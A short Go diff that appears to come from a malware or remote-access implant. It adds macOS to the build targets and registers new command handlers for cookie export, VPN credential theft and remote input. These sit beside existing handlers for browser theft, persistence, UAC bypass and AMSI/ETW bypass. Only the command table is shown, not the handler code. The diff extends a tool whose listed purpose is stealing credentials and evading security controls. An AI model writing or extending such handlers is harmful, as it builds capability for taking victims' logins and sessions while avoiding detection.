@@ -1,5 +1,5 @@
-//go:build linux || windows
-// +build linux windows
+//go:build linux || windows || darwin
+// +build linux windows darwin
 
 package main
 
@@ -99,6 +99,9 @@ func init() {
 		"persistence_list":          handlePersistenceList,
 		"persistence_remove":        handlePersistenceRemove,
 		"browser_steal":             handleBrowserSteal,
+		"cookie_export":             handleCookieExport,
+		"vpn_creds":                 handleVpnCreds,
+		"remote_input":              handleRemoteInput,
 		"uac_bypass":                handleUACBypass,
 		"amsi_bypass":               handleAMSIByPass,
 		"etw_bypass":                handleETWByPass,
